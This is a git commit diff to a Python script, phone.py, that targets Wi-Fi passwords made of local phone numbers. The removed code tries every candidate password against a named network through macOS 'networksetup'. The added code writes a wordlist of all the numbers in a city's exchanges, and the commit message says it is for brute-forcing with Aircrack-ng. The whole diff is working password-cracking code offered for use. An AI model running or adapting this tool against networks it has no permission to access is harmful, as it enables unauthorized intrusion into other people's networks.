4516ab3a0701e1ec1bb8395d540d6af034cc9d16
Ben <ben.loula@yahoo.com>
2017-12-04 15:54:50 -0600

    Update phone.py
    Revamping the code to make it easy to dump into Aircrack-ng for super fast brute-force action.

--- phone.py
+++ phone.py
@@ -3,39 +3,34 @@ import subprocess
 import csv
 import argparse
  
-# h/t https://bluembed.wordpress.com/2016/01/16/python-script-to-hack-wifi-networks-using-brutal-force/
-# to do: asynchronous i/o or threading for speed?
-# to do: use this script to generate a wordlist for Aircrack?
 # to do: make sure the CSV has correct city names
 # to do: input validation
 
-#area = 'NA'
-ssid = 'NA'
 city = 'NA'
 state = 'NA'
 exchanges = []
 
-parser = argparse.ArgumentParser(description='Enter your city and state and this script will brute force Wi-Fi passwords based on valid phone numbers.')
-#parser.add_argument('-a', help='The NPA area code',required=False)
-parser.add_argument('--ssid', help='SSID name',required=True)
+# set up command line arguments
+parser = argparse.ArgumentParser(description='Enter your city and state abbreviation and this script will brute force Wi-Fi passwords based on valid phone numbers.')
 parser.add_argument('-c', help='City name',required=True)
 parser.add_argument('-s', help='State abbreviation',required=True)
 args = parser.parse_args()
 
-#area = args.a
-ssid = args.ssid
+# read command line arguments, force uppercase
 city = args.c
 state = args.s
 city = city.upper()
 state = state.upper()
 
-#print "Your area code is %s." % area
-#print "Your city is %s." % city
-#print "Your state is %s." % state
+# clear previous wordlist
+e = open("phoneList.txt","w")
+e.write("")
+e.close()
 
-#search_for = [area]
-search_for = [city, state]
+# magic occurs
+# search_for = [city, state]
 
+# pull out valid NPA/NXX exchange numbers for the requested city
 with open('phones.csv') as inf:
   reader = csv.reader(inf)
   for row in reader:
@@ -44,20 +39,21 @@ with open('phones.csv') as inf:
   print "List of valid NPA/NXX numbers for %s, %s:" % (city, state)
   print exchanges
 
+# generate all 10,000 possibilities for each exchange
 for i in exchanges:
-  for y in range(0, 9):
-    for z in range(0, 9):
-      for l in range(0, 9):
-        for m in range(0, 9):
-          password=[i,y,z,l,m]
-          str1 = ''.join(str(e)for e in password)
-          print "Is the password %s?" % str1
-          proc = subprocess.Popen(["networksetup", "-setairportnetwork","en0",ssid,str1],stdout=subprocess.PIPE)
-          x=proc.stdout.readline()
-          try:
-            if (x[0]=='F'): # output generated if password is wrong is "False network password" so I take the first letter F and check it
-              print("Nope.")
-          except IndexError : # if password is correct there's no command reply hence no string to access it with x[0]
-              print "Yup!"
-              print "The password is %s." % str1
-              exit()
+  for y in range(0, 10):
+    for z in range(0, 10):
+      for l in range(0, 10):
+        for m in range(0, 10):
+
+# squish 'em together
+          passwordParts=[i,y,z,l,m]
+          password = ''.join(str(b)for b in passwordParts)
+
+# write each password candidate to file
+          f = open("phoneList.txt","a")
+          f.write(password + '\n')
+          f.close()
+
+# great job
+print "Done. See /phoneList.txt for your phone number wordlist."
